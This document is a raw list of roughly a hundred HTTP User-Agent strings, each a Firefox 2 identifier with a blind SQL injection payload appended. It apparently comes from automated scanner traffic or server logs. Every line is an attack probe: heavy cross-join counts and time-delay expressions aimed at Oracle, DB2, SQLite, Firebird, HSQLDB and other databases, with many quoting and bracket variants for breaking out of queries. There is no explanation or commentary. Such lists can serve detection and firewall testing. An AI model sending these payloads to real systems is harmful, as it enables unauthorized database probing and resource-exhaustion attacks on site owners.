Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 1043=1043 OR 5933=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT CHR(107)||CHR(75)||CHR(80)||CHR(112) WHERE 1416=1416 OR 5933=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT CHR(70)||CHR(76)||CHR(118)||CHR(111) WHERE 4295=4295 OR 5933=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AS nwQP WHERE 4777=4777 OR 5933=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 6965=6965 OR 5933=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND 2456=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- xWPw
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHR(80)||CHR(104)||CHR(118)||CHR(101) FROM DUAL WHERE 6696=6696 AND 2456=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3))||'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 OR 9882=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- RlXk
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) OR 9882=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ((('KowC'='KowC
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) OR 9882=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND ((\x22dCor\x22=\x22dCor
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 7701=7701 AND 8623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 6095=6095 AND 8623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHR(72)||CHR(82)||CHR(105)||CHR(102) FROM DUAL WHERE 5523=5523 AND 8623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHR(65)||CHR(75)||CHR(105)||CHR(68) WHERE 2937=2937 AND 8623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS ZtDP WHERE 3876=3876 AND 8623=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 9054=9054 OR 4072=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 1739=1739 OR 4072=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHR(119)||CHR(74)||CHR(113)||CHR(67) FROM DUAL WHERE 3514=3514 OR 4072=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT CHR(66)||CHR(75)||CHR(99)||CHR(105) WHERE 8751=8751 OR 4072=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND 1081=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2))))-- nvVM
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 AND 1081=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2))))
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AND 1081=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2)))) AND ('jQBA'='jQBA
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AND 1081=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2)))) AND (\x22gppg\x22 LIKE \x22gppg
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT jBJJ WHERE 3296=3296 AND 1081=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2)))))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AS rXBM WHERE 7128=7128 AND 1081=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2))))-- Yhol
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR 2686=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2)))) AND (9007=9007
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') OR 2686=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2)))) AND ('QBRi' LIKE 'QBRi
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 1321=1321 OR 2686=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2))))-- uZXf
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 5154=5154 AND 8054=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2))))--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT HWuq WHERE 8743=8743 AND 8054=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2))))--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT NCbd WHERE 7011=7011 AND 8054=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2))))--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS EObN WHERE 9176=9176 AND 8054=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(3200000000/2))))--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AND 5186=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)-- CSOR
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND 5186=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)-- ykKS
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AND 5186=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND (('fpgU' LIKE 'fpgU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AND 5186=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND (\x22kjet\x22=\x22kjet
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'))) OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND ((('IgHk' LIKE 'IgHk
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND \x22NRsX\x22=\x22NRsX
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 6274=6274 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)-- tplh
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT bpJN WHERE 3711=3711 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4))||
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 3539=3539 AND 6411=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17` WHERE 2014=2014 AND 6411=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 2044=2044 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT pSIA WHERE 1105=1105 OR 2652=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (6127=6127
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT yLkG WHERE 8258=8258 AND 5755=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- LsFQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (7031=7031
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17)) OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ((9733=9733
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND (('AhNu'='AhNu
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- BBEq
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)# phgQ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS EKrt WHERE 9851=9851 OR 8912=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)-- FaJv
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AS rHJw WHERE 9957=9957 AND 8539=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 5062=5062 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17+(SELECT sIBo WHERE 2733=2733 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AS cozy WHERE 5253=5253 OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' IN BOOLEAN MODE) OR 8998=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND (((7845=7845
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND ('RbTY' LIKE 'RbTY
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22)) AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND ((\x22DubS\x22=\x22DubS
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL) AND \x22nMyg\x22=\x22nMyg
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 6139=6139 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)-- URIc
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) AS SYdA WHERE 5045=5045 AND CHAR(86)||CHAR(73)||CHAR(122)||CHAR(111)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9723),0),32000000000),NULL)-- qFZh
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL) AND 'uJzw' LIKE 'uJzw
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)# Ejwq
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) WHERE 5478=5478 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- fgUd
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 8310=8310 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- PmYv
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'+(SELECT CHAR(80)||CHAR(113)||CHAR(70)||CHAR(84) WHERE 2929=2929 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL))+'
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 3897=3897 OR CHAR(111)||CHAR(100)||CHAR(117)||CHAR(77)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5203),0),32000000000),NULL)-- NRiU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 9825=9825 AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 WHERE 1358=1358 AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17`) WHERE 7665=7665 AND CHAR(117)||CHAR(108)||CHAR(106)||CHAR(81)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(8765),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 6995=6995 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' WHERE 4583=4583 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT CHAR(100)||CHAR(83)||CHAR(79)||CHAR(101) WHERE 1860=1860 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(115)||CHAR(111)||CHAR(113)||CHAR(109) FROM DUAL WHERE 5170=5170 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17||(SELECT CHAR(71)||CHAR(118)||CHAR(111)||CHAR(84) WHERE 9744=9744 OR CHAR(68)||CHAR(110)||CHAR(109)||CHAR(79)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4222),0),32000000000),NULL)--
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- FqTI
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17))) AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (((3245=3245
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (('EwXa'='EwXa
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND \x22WXOq\x22=\x22WXOq
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17') WHERE 6129=6129 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- pYSU
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22) WHERE 6644=6644 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- SEFJ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17\x22 WHERE 1539=1539 AND CHAR(65)||CHAR(114)||CHAR(81)||CHAR(73)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- JGHt
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL)-- KJwH
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (7766=7766
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')) OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND (('MvMZ'='MvMZ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17%' OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) AND 'QQOJ%'='QQOJ
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17' OR CHAR(102)||CHAR(117)||CHAR(120)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),3200000000),NULL) OR 'ZFoB'='yhjO
